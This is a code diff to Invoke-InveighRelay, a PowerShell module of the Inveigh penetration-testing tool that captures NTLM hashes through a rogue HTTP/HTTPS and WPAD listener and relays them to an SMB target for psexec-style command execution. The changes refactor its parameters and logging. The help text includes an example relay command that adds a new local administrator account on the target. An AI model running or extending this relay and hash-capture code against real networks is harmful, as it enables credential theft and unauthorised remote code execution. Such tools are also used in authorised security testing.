@@ -8,21 +8,24 @@ Invoke-InveighRelay is the main Inveigh SMB relay function. Invoke-InveighRelay 
 Invoke-InveighRelay currently supports NTLMv2 HTTP to SMB relay with psexec style command execution.
 
 .PARAMETER HTTP
-Default = Enabled: Enable/Disable HTTP challenge/response capture.
+Default = Enabled: (Y/N) Enable/Disable HTTP challenge/response capture.
 
 .PARAMETER HTTPS
-Default = Disabled: Enable/Disable HTTPS challenge/response capture. Warning, a cert will be installed in the local store and attached to port 443.
+Default = Disabled: (Y/N) Enable/Disable HTTPS challenge/response capture. Warning, a cert will be installed in the local store and attached to port 443.
 If the script does not exit gracefully, execute "netsh http delete sslcert ipport=0.0.0.0:443" and manually remove the certificate from "Local Computer\Personal" in the cert store.
+
+.PARAMETER HTTPSCertThumbprint
+Specify a certificate thumbprint for use with a custom certificate. The certificate filename must be inveigh.pfx.
 
 .PARAMETER Challenge
 Default = Random: Specify a 16 character hex NTLM challenge for use with the HTTP listener. If left blank, a random challenge will be generated for each request.
 Note that during SMB relay attempts, the challenge will be pulled from the SMB relay target. 
 
 .PARAMETER MachineAccounts
-Default = Disabled: Enable/Disable showing NTLM challenge/response captures from machine accounts.
+Default = Disabled: (Y/N) Enable/Disable showing NTLM challenge/response captures from machine accounts.
 
-.PARAMETER ForceWPADAuth
-Default = Enabled: Matches Responder option to Enable/Disable authentication for wpad.dat GET requests. Disabling can prevent browser login prompts.
+.PARAMETER WPADAuth
+Default = NTLM: (Anonymous,NTLM) Specify the HTTP/HTTPS server authentication type for wpad.dat requests. Setting to Anonymous can prevent browser login prompts.
 
 .PARAMETER SMBRelayTarget
 IP address of system to target for SMB relay.
@@ -34,35 +37,35 @@ Command to execute on SMB relay target.
 Default = All Usernames: Comma separated list of usernames to use for relay attacks. Accepts both username and domain\username format. 
 
 .PARAMETER SMBRelayAutoDisable
-Default = Enable: Automaticaly disable SMB relay after a successful command execution on target.
+Default = Enable: (Y/N) Automaticaly disable SMB relay after a successful command execution on target.
 
 .PARAMETER SMBRelayNetworkTimeout
-Default = No Timeout: Set the duration in seconds that Inveigh will wait for a reply from the SMB relay target after each packet is sent.
+Default = No Timeout: (Integer) Set the duration in seconds that Inveigh will wait for a reply from the SMB relay target after each packet is sent.
 
 .PARAMETER ConsoleOutput
-Default = Disabled: Enable/Disable real time console output. If using this option through a shell, test to ensure that it doesn't hang the shell.
+Default = Disabled: (Y/N) Enable/Disable real time console output. If using this option through a shell, test to ensure that it doesn't hang the shell.
 
 .PARAMETER FileOutput
-Default = Disabled: Enable/Disable real time file output.
+Default = Disabled: (Y/N) Enable/Disable real time file output.
 
 .PARAMETER StatusOutput
-Default = Enabled: Enable/Disable statup and shutdown messages.
+Default = Enabled: (Y/N) Enable/Disable startup and shutdown messages.
 
 .PARAMETER OutputStreamOnly
 Default = Disabled: Enable/Disable forcing all output to the standard output stream. This can be helpful if running Inveigh through a shell that does not return other output streams.
 Note that you will not see the various yellow warning messages if enabled.
 
 .PARAMETER OutputDir
-Default = Working Directory: Set an output directory for log and capture files.
+Default = Working Directory: Set a valid path to an output directory for log and capture files. FileOutput must also be enabled.
 
 .PARAMETER ShowHelp
-Default = Enabled: Enable/Disable the help messages at startup.
+Default = Enabled: (Y/N) Enable/Disable the help messages at startup.
 
 .PARAMETER Tool
-Default = 0: Enable/Disable features for better operation through external tools such as Metasploit's Interactive Powershell Sessions and Empire. 0 = None, 1 = Metasploit, 2 = Empire  
+Default = 0: (0,1,2) Enable/Disable features for better operation through external tools such as Metasploit's Interactive Powershell Sessions and Empire. 0 = None, 1 = Metasploit, 2 = Empire  
 
 .EXAMPLE
-Invoke-InveighRelay -SMBRelayTarget 192.168.2.55 -SMBRelayCommand "net user Dave Summer2015 /add && net localgroup administrators Dave /add"
+Invoke-InveighRelay -SMBRelayTarget 192.168.2.55 -SMBRelayCommand "net user Dave Winter2016 /add && net localgroup administrators Dave /add"
 Execute with SMB relay enabled with a command that will create a local administrator account on the SMB relay target.  
 
 .EXAMPLE
@@ -77,24 +80,29 @@ https://github.com/mubix/post-exploitation/blob/master/scripts/mass_mimikatz/pow
 https://github.com/Kevin-Robertson/Inveigh
 
 #>
+
+# Default parameter values can be modified in this section 
 param
 ( 
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$HTTP="Y",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$HTTPS="N",
-    [parameter(Mandatory=$false)][ValidatePattern('^[A-Fa-f0-9]{16}$')][string]$Challenge="",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$ConsoleOutput="N",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$FileOutput="N",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$StatusOutput="Y",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$OutputStreamOnly="N",
-    [parameter(Mandatory=$true)][ValidateScript({$_ -match [IPAddress]$_ })][string]$SMBRelayTarget ="",
-    [parameter(Mandatory=$false)][array]$SMBRelayUsernames,
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$SMBRelayAutoDisable="Y",
-    [parameter(Mandatory=$false)][int]$SMBRelayNetworkTimeout="",
     [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$MachineAccounts="N",
-    [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][string]$OutputDir="",
-    [parameter(Mandatory=$true)][string]$SMBRelayCommand = "",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$ShowHelp="Y",
+    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$SMBRelayAutoDisable="Y",
+    [parameter(Mandatory=$false)][ValidateSet("Anonymous","NTLM")][string]$WPADAuth="NTLM",
     [parameter(Mandatory=$false)][ValidateSet("0","1","2")][string]$Tool="0",
-    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$ShowHelp="Y"
+    [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][string]$OutputDir="",
+    [parameter(Mandatory=$true)][ValidateScript({$_ -match [IPAddress]$_ })][string]$SMBRelayTarget ="",
+    [parameter(Mandatory=$false)][ValidatePattern('^[A-Fa-f0-9]{16}$')][string]$Challenge="",
+    [parameter(Mandatory=$false)][array]$SMBRelayUsernames="",
+    [parameter(Mandatory=$false)][int]$SMBRelayNetworkTimeout="",
+    [parameter(Mandatory=$true)][string]$SMBRelayCommand = "", 
+    [parameter(Mandatory=$false)][string]$HTTPSCertThumbprint="76a49fd27011cf4311fb6914c904c90a89f3e4b2",
+    [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
 )
 
 if ($invalid_parameter)
@@ -106,8 +114,7 @@ if(!$SMBRelayTarget)
 {
     Throw "You must specify an -SMBRelayTarget if enabling -SMBRelay"
 }
-
-if(!$SMBRelayCommand)
+elseif(!$SMBRelayCommand)
 {
     Throw "You must specify an -SMBRelayCommand if enabling -SMBRelay"
 }
@@ -131,6 +138,11 @@ if(!$inveigh)
     $inveigh.SMBRelay_failed_list = @()
 }
 
+if($inveigh.relay_running)
+{
+    Throw "Invoke-InveighRelay is already running, use Stop-Inveigh"
+}
+
 if($inveigh.HTTP_listener.IsListening)
 {
     $inveigh.HTTP_listener.Stop()
@@ -144,7 +156,7 @@ if(!$inveigh.running)
     $inveigh.log_file_queue = New-Object System.Collections.ArrayList
     $inveigh.NTLMv1_file_queue = New-Object System.Collections.ArrayList
     $inveigh.NTLMv2_file_queue = New-Object System.Collections.ArrayList
-    $inveigh.certificate_thumbprint = "76a49fd27011cf4311fb6914c904c90a89f3e4b2"
+    $inveigh.certificate_thumbprint = $HTTPSCertThumbprint
     $inveigh.HTTP_challenge_queue = New-Object System.Collections.ArrayList
     $inveigh.console_output = $false
     $inveigh.console_input = $true
@@ -152,7 +164,7 @@ if(!$inveigh.running)
     $inveigh.log_out_file = $output_directory + "\Inveigh-Log.txt"
     $inveigh.NTLMv1_out_file = $output_directory + "\Inveigh-NTLMv1.txt"
     $inveigh.NTLMv2_out_file = $output_directory + "\Inveigh-NTLMv2.txt"
-    $Inveigh.challenge = $Challenge
+    $inveigh.challenge = $Challenge
 }
 
 $inveigh.relay_running = $true
@@ -254,14 +266,7 @@ if(!$inveigh.running)
         $inveigh.status_queue.add("Ignoring Machine Accounts")|Out-Null
     }
 
-    if($ForceWPADAuth -eq 'y')
-    {
-        $inveigh.status_queue.add("Force WPAD Authentication Enabled")|Out-Null
-    }
-    else
-    {
-        $inveigh.status_queue.add("Force WPAD Authentication Disabled")|Out-Null
-    }
+    $inveigh.status_queue.add("Force WPAD Authentication = $WPADAuth")|Out-Null
 
     if($ConsoleOutput -eq 'y')
     {
@@ -295,17 +300,15 @@ if(!$inveigh.running)
 $inveigh.status_queue.add("SMB Relay Enabled") |Out-Null
 $inveigh.status_queue.add("SMB Relay Target = $SMBRelayTarget")|Out-Null
 
-if($SMBRelayUsernames.Count -gt 0)
+if($SMBRelayUsernames)
 {
-    $SMBRelayUsernames_output = $SMBRelayUsernames -join ","
-    
     if($SMBRelayUsernames.Count -eq 1)
     {
-        $inveigh.status_queue.add("SMB Relay Username = $SMBRelayUsernames_output")|Out-Null
+        $inveigh.status_queue.add("SMB Relay Username = " + $SMBRelayUsernames -join ",")|Out-Null
     }
     else
     {
-        $inveigh.status_queue.add("SMB Relay Usernames = $SMBRelayUsernames_output")|Out-Null
+        $inveigh.status_queue.add("SMB Relay Usernames = " + $SMBRelayUsernames -join ",")|Out-Null
     }
 }
 
@@ -907,7 +910,7 @@ $SMB_relay_execute_scriptblock =
 # HTTP/HTTPS Server ScriptBlock - HTTP/HTTPS listener
 $HTTP_scriptblock = 
 { 
-    param ($SMBRelayTarget,$SMBRelayCommand,$SMBRelayUsernames,$SMBRelayAutoDisable,$SMBRelayNetworkTimeout,$MachineAccounts,$ForceWPADAuth)
+    param ($SMBRelayTarget,$SMBRelayCommand,$SMBRelayUsernames,$SMBRelayAutoDisable,$SMBRelayNetworkTimeout,$MachineAccounts,$WPADAuth)
 
     Function NTLMChallengeBase64
     {
@@ -968,8 +971,7 @@ $HTTP_scriptblock =
             $HTTP_type = "HTTP"
         }
         
-        
-        if (($inveigh.request.RawUrl -match '/wpad.dat') -and ($ForceWPADAuth -eq 'n'))
+        if (($inveigh.request.RawUrl -match '/wpad.dat') -and ($WPADAuth -eq 'Anonymous'))
         {
             $inveigh.response.StatusCode = 200
         }
@@ -988,6 +990,9 @@ $HTTP_scriptblock =
             
             if ($HTTP_request_bytes[8] -eq 1)
             {
+                $inveigh.console_queue.add("$(Get-Date -format 's') - $HTTP_type request for " + $inveigh.request.RawUrl + " received from " + $inveigh.request.RemoteEndpoint.Address)
+                $inveigh.log.add($inveigh.log_file_queue[$inveigh.log_file_queue.add("$(Get-Date -format 's') - $HTTP_type request for " + $inveigh.request.RawUrl + " received from " + $inveigh.request.RemoteEndpoint.Address)])
+
                 if(($inveigh.SMB_relay) -and ($inveigh.SMB_relay_active_step -eq 0) -and ($inveigh.request.RemoteEndpoint.Address -ne $SMBRelayTarget))
                 {
                     $inveigh.SMB_relay_active_step = 1
@@ -1100,7 +1105,7 @@ $HTTP_scriptblock =
                         }                   
                     }
                     
-                    if (($inveigh.IP_capture_list -notcontains $inveigh.request.RemoteEndpoint.Address) -and (-not $HTTP_NTLM_user_string.EndsWith('$')) -and (!$inveigh.repeat))
+                    if (($inveigh.IP_capture_list -notcontains $inveigh.request.RemoteEndpoint.Address) -and (-not $HTTP_NTLM_user_string.EndsWith('$')) -and (!$inveigh.spoofer_repeat))
                     {
                         $inveigh.IP_capture_list += $inveigh.request.RemoteEndpoint.Address
                     }
@@ -1126,7 +1131,7 @@ $HTTP_scriptblock =
                         
                     }
                     
-                    if (($inveigh.IP_capture_list -notcontains $inveigh.request.RemoteEndpoint.Address) -and (-not $HTTP_NTLM_user_string.EndsWith('$')) -and (!$inveigh.repeat))
+                    if (($inveigh.IP_capture_list -notcontains $inveigh.request.RemoteEndpoint.Address) -and (-not $HTTP_NTLM_user_string.EndsWith('$')) -and (!$inveigh.spoofer_repeat))
                     {
                         $inveigh.IP_capture_list += $inveigh.request.RemoteEndpoint.Address
                     }
@@ -1270,7 +1275,7 @@ Function HTTPListener()
     $HTTP_powershell.AddScript($HTTP_scriptblock).AddArgument(
         $SMBRelayTarget).AddArgument($SMBRelayCommand).AddArgument($SMBRelayUsernames).AddArgument(
         $SMBRelayAutoDisable).AddArgument($SMBRelayNetworkTimeout).AddArgument(
-        $MachineAccounts).AddArgument($ForceWPADAuth) > $null
+        $MachineAccounts).AddArgument($WPADAuth) > $null
     $HTTP_handle = $HTTP_powershell.BeginInvoke()
 }
 
@@ -1526,11 +1531,11 @@ Function Get-InveighNTLMv1
     Get-InveighNTLMv1 will get captured NTLMv1 challenge/response hashes.
     
     .PARAMETER Unique
-    Default = Disabled: Enable/Disable displaying only the first captured challenge/response for each unique account.
+    Display only the first captured challenge/response for each unique account.
     #>
     param
     ( 
-        [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$Unique="N",
+        [parameter(Mandatory=$false)][switch]$Unique,
         [parameter(ValueFromRemainingArguments=$true)] $invalid_parameter
     )
 
@@ -1539,7 +1544,7 @@ Function Get-InveighNTLMv1
         throw "$($invalid_parameter) is not a valid parameter."
     }
 
-    if($Unique -eq 'y')
+    if($Unique)
     {
         $inveigh.NTLMv1_list.sort()
 
@@ -1568,11 +1573,11 @@ Function Get-InveighNTLMv2
     Get-InveighNTLMv2 will get captured NTLMv1 challenge/response hashes.
 
     .PARAMETER Unique
-    Default = Disabled: Enable/Disable displaying only the first captured challenge/response for each unique account.
+    Display only the first captured challenge/response for each unique account.
     #>
     param
     ( 
-        [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]$Unique="N",
+        [parameter(Mandatory=$false)][switch]$Unique,
         [parameter(ValueFromRemainingArguments=$true)] $invalid_parameter
     )
 
@@ -1581,7 +1586,7 @@ Function Get-InveighNTLMv2
         throw "$($invalid_parameter) is not a valid parameter."
     }
 
-    if($Unique -eq 'y')
+    if($Unique)
     {
         $inveigh.NTLMv2_list.sort()
 
@@ -1618,6 +1623,7 @@ Function Get-InveighStats
     .SYNOPSIS
     Get-InveighLog will get log.
     #>
+    Write-Output("Total Cleartext Captures = " + $inveigh.cleartext_list.count)
     Write-Output("Total NTLMv1 Captures = " + $inveigh.NTLMv1_list.count)
     Write-Output("Total NTLMv2 Captures = " + $inveigh.NTLMv2_list.count)
 }
